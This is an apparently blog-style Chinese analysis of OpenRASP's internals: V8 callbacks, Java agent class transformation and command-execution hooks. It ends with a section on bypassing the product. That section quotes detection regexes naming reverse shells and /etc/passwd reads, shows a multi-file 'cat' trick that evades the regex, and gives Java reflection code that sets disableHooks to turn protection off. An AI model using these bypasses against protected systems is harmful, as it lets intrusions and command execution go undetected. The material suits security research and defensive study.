i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    arr-&gt;<span class="built_in">Set</span>(context, i, v8::Integer::<span class="built_in">New</span>(isolate, token_result.result[i])).<span class="built_in">IsJust</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(token_result.result);</span><br><span class="line">  info.<span class="built_in">GetReturnValue</span>().<span class="built_in">Set</span>(arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">request_callback</span><span class="params">(<span class="keyword">const</span> v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> isolate = info.<span class="built_in">GetIsolate</span>();</span><br><span class="line">  <span class="function">v8::TryCatch <span class="title">try_catch</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  <span class="keyword">auto</span> context = isolate-&gt;<span class="built_in">GetCurrentContext</span>();</span><br><span class="line">  v8::Local&lt;v8::Promise::Resolver&gt; resolver;</span><br><span class="line">  <span class="keyword">if</span> (!v8::Promise::Resolver::<span class="built_in">New</span>(context).<span class="built_in">ToLocal</span>(&amp;resolver)) &#123;</span><br><span class="line">    try_catch.<span class="built_in">ReThrow</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  info.<span class="built_in">GetReturnValue</span>().<span class="built_in">Set</span>(resolver-&gt;<span class="built_in">GetPromise</span>());</span><br><span class="line">  <span class="function">HTTPRequest <span class="title">req</span><span class="params">(isolate, info[<span class="number">0</span>])</span></span>;</span><br><span class="line">  HTTPResponse res = req.<span class="built_in">GetResponse</span>();</span><br><span class="line">  <span class="keyword">auto</span> object = res.<span class="built_in">ToObject</span>(isolate);</span><br><span class="line">  <span class="keyword">if</span> (res.error) &#123;</span><br><span class="line">    resolver-&gt;<span class="built_in">Reject</span>(context, object).<span class="built_in">IsJust</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    resolver-&gt;<span class="built_in">Resolve</span>(context, object).<span class="built_in">IsJust</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">request_async_callback</span><span class="params">(<span class="keyword">const</span> v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> isolate = info.<span class="built_in">GetIsolate</span>();</span><br><span class="line">  AsyncRequest::<span class="built_in">GetInstance</span>().<span class="built_in">Submit</span>(std::make_shared&lt;HTTPRequest&gt;(isolate, info[<span class="number">0</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span>* Snapshot::external_references = <span class="keyword">new</span> <span class="keyword">intptr_t</span>[<span class="number">5</span>]&#123;</span><br><span class="line">    <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(log_callback),</span><br><span class="line">    <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(flex_callback),</span><br><span class="line">    <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(request_callback),</span><br><span class="line">    <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(request_async_callback),</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line">&#125;  <span class="comment">// namespace openrasp_v8</span></span><br></pre></td></tr></table></figure><p>理解了这一段以后接下来再次回到Java端</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/11.png"></p><p>这里获得<code>RASP.algorithmConfig</code>并保存到<code>ConfigItem.ALGORITHM_CONFIG</code></p><p>到这里插件更新部分就结束了</p><p>之后调用了<code>InitFileWatcher</code>,它的作用是创建以目录为单位的文件监听，如果文件进行增删改，就执行插件更新</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/12.png"></p><h4 id="Checker的初始化"><a href="#Checker的初始化" class="headerlink" title="Checker的初始化"></a>Checker的初始化</h4><p>接下来就是Checker的初始化</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/13.png"></p><p>这里会遍历</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/14.png"></p><p>遍历Type这个枚举类型将检测类型以及对应的检测函数添加到<code>checkers</code>这个<code>EnumMap</code>当中</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/15.png"></p><h4 id="CustomClassTransformer"><a href="#CustomClassTransformer" class="headerlink" title="CustomClassTransformer"></a>CustomClassTransformer</h4><p>继续回来接下来调用<code>this.initTransformer(inst);</code>，这里实例化<code>CustomClassTransformer</code>这个 Class 文件的转换器，<img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/16.png"></p><p>可以看到将自身作为类转换器进行添加</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">CustomClassTransformer</span><span class="params">(Instrumentation inst)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.inst = inst;</span><br><span class="line">  inst.addTransformer(<span class="keyword">this</span>, <span class="keyword">true</span>);</span><br><span class="line">  <span class="keyword">this</span>.addAnnotationHook();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并调用<code>retransform</code>，这里逻辑很简单就不多说，看不懂的可以自行学习<code>JavaAgent</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">retransform</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> LinkedList();</span><br><span class="line">        Class[] loadedClasses = <span class="keyword">this</span>.inst.getAllLoadedClasses();</span><br><span class="line">        Class[] arr$ = loadedClasses;</span><br><span class="line">        <span class="keyword">int</span> len$ = loadedClasses.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i$ = <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">            Class clazz = arr$[i$];</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.isClassMatched(clazz.getName().replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>)) &amp;&amp; <span class="keyword">this</span>.inst.isModifiableClass(clazz) &amp;&amp; !clazz.getName().startsWith(<span class="string">&quot;java.lang.invoke.LambdaForm&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.inst.retransformClasses(<span class="keyword">new</span> Class[]&#123;clazz&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var8) &#123;</span><br><span class="line">                    LogTool.error(ErrorType.HOOK_ERROR, <span class="string">&quot;failed to retransform class &quot;</span> + clazz.getName() + <span class="string">&quot;: &quot;</span> + var8.getMessage(), var8);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>因此之后当类加载的时候，会进入我们自己的 <code>Transformer</code> 中，执行 <code>transform</code>函数进行拦截</p><h4 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h4><p>因此接下来我们着重看<code>com.baidu.openrasp.transformer.CustomClassTransformer#transform</code>方法，它会遍历<code>hooks</code>，如果条件符合(isClassMatched返回true)则会在制定的类方法当中进行hook</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/17.png"></p><p>而这些类来源于哪里呢？就是<code>open.baidu.openrasp.hook</code>文件夹下的类</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/18.png"></p><p>这里呢我们就随便挑一个来进行解读，那就来一个<code>com.baidu.openrasp.hook.system.ProcessBuilderHook</code>命令执行的类的吧，可以看到isClassMatched的规则</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isClassMatched</span><span class="params">(String className)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ModuleLoader.isModularityJdk()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;java/lang/ProcessImpl&quot;</span>.equals(className);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!OSUtil.isLinux() &amp;&amp; !OSUtil.isMacOS()) &#123;</span><br><span class="line">        <span class="keyword">return</span> OSUtil.isWindows() ? <span class="string">&quot;java/lang/ProcessImpl&quot;</span>.equals(className) : <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;java/lang/UNIXProcess&quot;</span>.equals(className);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看调用到底是如何调用的，我们回到<code>com.baidu.openrasp.transformer.CustomClassTransformer#transform</code>，可以看到最终返回的字节码是受<code>hook.transformClass</code>处理的，在这里还有个小细节是如果<code>loader</code>为<code>null</code>，则会调用<code>setLoadedByBootstrapLoader</code>设置其中属性为<code>true</code>，我们也知道什么情况下获取不到类加载器也就是由BootStrap启动器类加载器加载的一些类如<code>File</code>、<code>Runtime</code>等等，在设置为<code>true</code>以后在后面hook的时候生成代码有部分区别，之后会提到</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/19.png"></p><p>我们可以看到<code>com.baidu.openrasp.hook.AbstractClassHook#transformClass</code>，它会调用具体实现类的<code>hookMethod</code>方法</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/20.png"></p><p>这里也就是对应<code>com.baidu.openrasp.hook.system.ProcessBuilderHook#hookMethod</code>，可以看到这里的处理也是很全面的挺好</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">hookMethod</span><span class="params">(CtClass ctClass)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException </span>&#123;</span><br><span class="line">    String src;</span><br><span class="line">    <span class="keyword">if</span> (ctClass.getName().contains(<span class="string">&quot;ProcessImpl&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (OSUtil.isWindows()) &#123;</span><br><span class="line">            src = <span class="keyword">this</span>.getInvokeStaticSrc(ProcessBuilderHook.class, <span class="string">&quot;checkCommand&quot;</span>, <span class="string">&quot;$1,$2&quot;</span>, <span class="keyword">new</span> Class[]&#123;String[].class, String.class&#125;);</span><br><span class="line">            <span class="keyword">this</span>.insertBefore(ctClass, <span class="string">&quot;&lt;init&gt;&quot;</span>, (String)<span class="keyword">null</span>, src);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ModuleLoader.isModularityJdk()) &#123;</span><br><span class="line">            src = <span class="keyword">this</span>.getInvokeStaticSrc(ProcessBuilderHook.class, <span class="string">&quot;checkCommand&quot;</span>, <span class="string">&quot;$1,$2,$4&quot;</span>, <span class="keyword">new</span> Class[]&#123;<span class="keyword">byte</span>[].class, <span class="keyword">byte</span>[].class, <span class="keyword">byte</span>[].class&#125;);</span><br><span class="line">            <span class="keyword">this</span>.insertBefore(ctClass, <span class="string">&quot;&lt;init&gt;&quot;</span>, (String)<span class="keyword">null</span>, src);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctClass.getName().contains(<span class="string">&quot;UNIXProcess&quot;</span>)) &#123;</span><br><span class="line">        src = <span class="keyword">this</span>.getInvokeStaticSrc(ProcessBuilderHook.class, <span class="string">&quot;checkCommand&quot;</span>, <span class="string">&quot;$1,$2,$4&quot;</span>, <span class="keyword">new</span> Class[]&#123;<span class="keyword">byte</span>[].class, <span class="keyword">byte</span>[].class, <span class="keyword">byte</span>[].class&#125;);</span><br><span class="line">        <span class="keyword">this</span>.insertBefore(ctClass, <span class="string">&quot;&lt;init&gt;&quot;</span>, (String)<span class="keyword">null</span>, src);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在具体要hook的类方法前面加上<code>checkCommand</code>这个函数</p><h5 id="回答上面遗留的ModuleClassloader的问题"><a href="#回答上面遗留的ModuleClassloader的问题" class="headerlink" title="回答上面遗留的ModuleClassloader的问题"></a>回答上面遗留的ModuleClassloader的问题</h5><p>在这里通过<code>getInvokeStaticSrc</code>这个方法生成具体插入的类，在这个方法当中可以看到，对于被BootStrap加载的类，它会通过<code>com.baidu.openrasp.ModuleLoader.moduleClassLoader</code>.<code>loadClass</code>去调用检查命令的<code>checkCommand</code>函数，这样就避免了由于双亲委派机制导致的<code>ClassNotFoundException</code></p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/27.png"></p><p>由于重载思想差不多就随便挑一个看看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkCommand</span><span class="params">(<span class="keyword">byte</span>[] command, <span class="keyword">byte</span>[] args, <span class="keyword">byte</span>[] envBlock)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((Boolean)HookHandler.enableCmdHook.get()) &#123;</span><br><span class="line">            LinkedList&lt;String&gt; commands = <span class="keyword">new</span> LinkedList();</span><br><span class="line">          <span class="comment">//执行的命令</span></span><br><span class="line">            <span class="keyword">if</span> (command != <span class="keyword">null</span> &amp;&amp; command.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                commands.add(<span class="keyword">new</span> String(command, <span class="number">0</span>, command.length - <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">//执行的命令的参数</span></span><br><span class="line">            <span class="keyword">int</span> index;</span><br><span class="line">            <span class="keyword">if</span> (args != <span class="keyword">null</span> &amp;&amp; args.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> position = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(index = <span class="number">0</span>; index &lt; args.length; ++index) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (args[index] == <span class="number">0</span>) &#123;</span><br><span class="line">                        commands.add(<span class="keyword">new</span> String(Arrays.copyOfRange(args, position, index)));</span><br><span class="line">                        position = index + <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//来自envp参数，通常为空，通常是自己设置的环境变量</span></span><br><span class="line">            LinkedList&lt;String&gt; envList = <span class="keyword">new</span> LinkedList();</span><br><span class="line">            <span class="keyword">if</span> (envBlock != <span class="keyword">null</span>) &#123;</span><br><span class="line">                index = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; envBlock.length; ++i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (envBlock[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                        String envItem = <span class="keyword">new</span> String(envBlock, index + <span class="number">1</span>, i - index - <span class="number">1</span>);</span><br><span class="line">                        <span class="keyword">if</span> (envItem.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            envList.add(envItem);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        index = i;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            checkCommand((List)commands, (List)envList);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>之后在讲命令和环境变量放到<code>commands</code>与<code>envList</code>当中并执行<code>checkCommand((List)commands, (List)envList);</code>，这里会把执行的命令、环境变量、以及当前调用栈存放到params这个变量当中</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/21.png"></p><p>之后带着这些参数执行<code>HookHandler.doCheckWithoutRequest</code>,这里省略一些废话</p><p>之后在<code>com.baidu.openrasp.HookHandler#doRealCheckWithoutRequest</code></p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/22.png"></p><p>会选择合适的checker去检查我们执行的东西</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(Type type, CheckParameter parameter)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((Checker)checkers.get(type)).check(parameter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续省略一堆废话，最终会调用到<code>V8.check</code></p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/23.png"></p><p>我们来看看对应的c源码，这里忽略前面部分，后面这里有个比较骚的v8的函数<code>SetLazyDataProperty</code></p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/24.png"></p><p>函数对应的Getter是GetStack，可以看到这个函数里面比较核心的操作就是通过JNIENV去调用Java的<code>com.baidu.openrasp.v8.V8#GetStack</code>函数很骚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetStack</span><span class="params">(v8::Local&lt;v8::Name&gt; name, <span class="keyword">const</span> v8::PropertyCallbackInfo&lt;v8::Value&gt;&amp; info)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> isolate = <span class="keyword">reinterpret_cast</span>&lt;openrasp_v8::Isolate*&gt;(info.<span class="built_in">GetIsolate</span>());</span><br><span class="line">  <span class="keyword">auto</span> env = <span class="built_in">GetJNIEnv</span>(isolate);</span><br><span class="line">  jbyteArray jbuf = <span class="keyword">reinterpret_cast</span>&lt;jbyteArray&gt;(env-&gt;<span class="built_in">CallStaticObjectMethod</span>(v8_class.cls, v8_class.GetStack));</span><br><span class="line">  <span class="keyword">if</span> (jbuf == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> info.<span class="built_in">GetReturnValue</span>().<span class="built_in">Set</span>(v8::Array::<span class="built_in">New</span>(isolate));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> maybe_string = v8::String::<span class="built_in">NewExternalOneByte</span>(isolate, <span class="keyword">new</span> <span class="built_in">ExternalOneByteStringResource</span>(env, jbuf));</span><br><span class="line">  <span class="keyword">if</span> (maybe_string.<span class="built_in">IsEmpty</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span> info.<span class="built_in">GetReturnValue</span>().<span class="built_in">Set</span>(v8::Array::<span class="built_in">New</span>(isolate));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> maybe_value = v8::JSON::<span class="built_in">Parse</span>(isolate-&gt;<span class="built_in">GetCurrentContext</span>(), maybe_string.<span class="built_in">ToLocalChecked</span>());</span><br><span class="line">  <span class="keyword">if</span> (maybe_value.<span class="built_in">IsEmpty</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span> info.<span class="built_in">GetReturnValue</span>().<span class="built_in">Set</span>(v8::Array::<span class="built_in">New</span>(isolate));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> value = maybe_value.<span class="built_in">ToLocalChecked</span>();</span><br><span class="line">  info.<span class="built_in">GetReturnValue</span>().<span class="built_in">Set</span>(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续往下看check函数，由于我们这里分析的是command，所以if部分暂时不用看，之后调用<code>isolate-&gt;Check</code>去执行检测(不截图了，简单来说就是找到对应的注册的检测函数去调用)</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/25.png"></p><h2 id="如何绕过"><a href="#如何绕过" class="headerlink" title="如何绕过"></a>如何绕过</h2><p>绕过的方式其实真的有很多，这里简单谈几个</p><h3 id="基于正则的绕过"><a href="#基于正则的绕过" class="headerlink" title="基于正则的绕过"></a>基于正则的绕过</h3><p>首先对于规则的检测既然是基于正则表达式，那么很显然如果在规则不够完善的情况之下，那也是可以造成一部分的绕过，比如我们可以看到在官方的插件当中，我们就拿这第一个查看文件的命令来说只是任意匹配1-5位，虽然不能通过多个空格之类的绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">command_common: &#123;</span><br><span class="line">  <span class="attr">name</span>:    <span class="string">&#x27;算法3 - 识别常用渗透命令（探针）&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:  <span class="string">&#x27;log&#x27;</span>,</span><br><span class="line">      <span class="attr">pattern</span>: <span class="string">&#x27;cat.&#123;1,5&#125;/etc/passwd|nc.&#123;1,30&#125;-e.&#123;1,100&#125;/bin/(?:ba)?sh|bash\\s-.&#123;0,4&#125;i.&#123;1,20&#125;/dev/tcp/|subprocess.call\\(.&#123;0,6&#125;/bin/(?:ba)?sh|fsockopen\\(.&#123;1,50&#125;/bin/(?:ba)?sh|perl.&#123;1,80&#125;socket.&#123;1,120&#125;open.&#123;1,80&#125;exec\\(.&#123;1,5&#125;/bin/(?:ba)?sh&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>我们的cat函数支持同时读多个文件<code>cat /abc/def /etc/passwd</code>，这样也是可以轻轻松松得以进行绕过</p><h3 id="通过修改某些属性"><a href="#通过修改某些属性" class="headerlink" title="通过修改某些属性"></a>通过修改某些属性</h3><p>通常如果存在反序列化漏洞，我们通常可以通过<code>TemplatesImpl</code>去加载任意字节码，在这里如果对于在RASP执行检测过程当中如果存在某些关键配置我们可以操控，那么就可以导致绕过，而OpenRasp里面就有，比如在执行检测前中间的调用流程有个<code>com.baidu.openrasp.HookHandler#doCheckWithoutRequest</code>，这里面提到了如果服务器的cpu使用率超过<code>90%</code>，<code>禁用全部hook点</code><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/28.png"></p><p>又或者满足当云控注册成功之前，不进入任何hook点，反正这些我们不都是可以通过反射去设置的么，这里我就随便来一个，就以第一个为例子吧，我们可以通过反射获取这个已经实例化的实例，在这个基础上修改<code>disableHooks</code>这个属性即可</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/29.png"></p><p>代码示例如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  Class&lt;?&gt; clz = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;com.baidu.openrasp.config.Config&quot;</span>);</span><br><span class="line">  java.lang.reflect.Method getConfig = clz.getDeclaredMethod(<span class="string">&quot;getConfig&quot;</span>);</span><br><span class="line">  java.lang.reflect.Field disableHooks = clz.getDeclaredField(<span class="string">&quot;disableHooks&quot;</span>);</span><br><span class="line">  disableHooks.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">  Object ins = getConfig.invoke(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">  disableHooks.set(ins,<span class="keyword">true</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br></pre></td></tr></table></figure><p>为了得到直观的效果我把插件当中的log改为block来演示下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 命令注入 - 常见命令</span></span><br><span class="line"><span class="attr">command_common</span>: &#123;</span><br><span class="line">  <span class="attr">name</span>:    <span class="string">&#x27;算法3 - 识别常用渗透命令（探针）&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:  <span class="string">&#x27;block&#x27;</span>,</span><br><span class="line">      <span class="attr">pattern</span>: <span class="string">&#x27;cat.&#123;1,5&#125;/etc/passwd|nc.&#123;1,30&#125;-e.&#123;1,100&#125;/bin/(?:ba)?sh|bash\\s-.&#123;0,4&#125;i.&#123;1,20&#125;/dev/tcp/|subprocess.call\\(.&#123;0,6&#125;/bin/(?:ba)?sh|fsockopen\\(.&#123;1,50&#125;/bin/(?:ba)?sh|perl.&#123;1,80&#125;socket.&#123;1,120&#125;open.&#123;1,80&#125;exec\\(.&#123;1,5&#125;/bin/(?:ba)?sh|\\&#123;echo,.&#123;10,400&#125;&#123;base64,-d&#125;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>并简单写了个控制器模拟反序列化过程（一个字懒）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/off&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">off</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    Class&lt;?&gt; clz = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;com.baidu.openrasp.config.Config&quot;</span>);</span><br><span class="line">    java.lang.reflect.Method getConfig = clz.getDeclaredMethod(<span class="string">&quot;getConfig&quot;</span>);</span><br><span class="line">    java.lang.reflect.Field disableHooks = clz.getDeclaredField(<span class="string">&quot;disableHooks&quot;</span>);</span><br><span class="line">    disableHooks.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object ins = getConfig.invoke(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    disableHooks.set(ins,<span class="keyword">true</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先执行命令返回可爱小恐龙</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/30.png"></p><p>当我访问<code>off</code>路由成功关闭rasp的hook功能</p><p><img src="/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90/31.png"></p><p>当然你可能会说还有其他的关闭的hook点，比如刚刚上面提到的<code>doCheckWithoutRequest</code>实际上最终是通过<code>doRealCheckWithoutRequest</code>去进行下一步操作，但毕竟也是类似的意思就不多考虑这些更改属性的了点到为止，毕竟只要破坏中间任一环节即可</p><p><img 